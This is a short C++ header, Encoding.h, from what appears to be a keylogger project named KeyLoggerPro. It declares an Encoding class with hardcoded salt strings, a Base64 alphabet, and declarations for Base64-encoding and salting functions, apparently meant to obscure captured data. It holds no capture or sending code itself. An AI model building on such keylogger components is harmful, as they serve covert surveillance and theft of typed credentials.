/**
 * Encoding.h
 *
 * @author Raul Butuc
 * @version 1.0.0 - 27/07/2016
 */

#pragma once

#include "stdafx.h"
#include <string>

namespace KeyLoggerPro {

  class Encoding {

    private:
      const std::string &_ENCY__St = "6!KA:KF/DmRX-vy_TbV";
      const std::string &_ENCY__Nd = "XJ++tx33o*nMwBe;PJ";
      const std::string &_ENCY__Rd = "2Ry::4AKe2/qbo+82*x";
      const std::string &_B64__CD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    public:
      std::string encodeB64(const std::string&);
      std::string addSalt(const std::string&);

  };

}
